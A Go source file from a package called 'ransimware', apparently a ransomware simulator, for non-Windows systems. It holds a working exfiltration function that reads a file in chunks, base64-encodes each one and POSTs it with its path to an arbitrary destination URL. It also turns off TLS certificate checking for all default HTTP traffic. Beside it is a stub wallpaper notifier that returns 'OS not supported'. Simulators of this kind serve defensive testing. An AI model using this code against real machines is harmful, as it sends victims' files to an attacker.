//+build !windows

package ransimware

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"time"
)

// HTTPExfil will return a function pointer to an ExfilFunc that
// exfils via HTTP POST requests with the specified headers.
func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
	return func(path string, b []byte) error {
		var b64 string
		var e error
		var n int
		var req *http.Request
		var stream = bytes.NewReader(b)
		var tmp [4 * 1024 * 1024]byte

		http.DefaultTransport.(*http.Transport).TLSClientConfig =
			&tls.Config{InsecureSkipVerify: true}

		for {
			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
				return nil
			} else if e != nil {
				return e
			}

			// Create request
			b64 = base64.StdEncoding.EncodeToString(tmp[:n])
			req, e = http.NewRequest(
				http.MethodPost,
				dst,
				bytes.NewBuffer([]byte(path+" "+b64)),
			)
			if e != nil {
				return e
			}

			// Set headers
			for k, v := range headers {
				req.Header.Set(k, v)
			}

			// Set timeout to 1 second
			http.DefaultClient.Timeout = time.Second

			// Send Message
			http.DefaultClient.Do(req)
		}
	}
}

// WallpaperNotify is a NotifyFunc that sets the background wallpaper.
func WallpaperNotify(image string, png []byte) NotifyFunc {
	return func() error {
		return fmt.Errorf("OS not supported")
	}
}
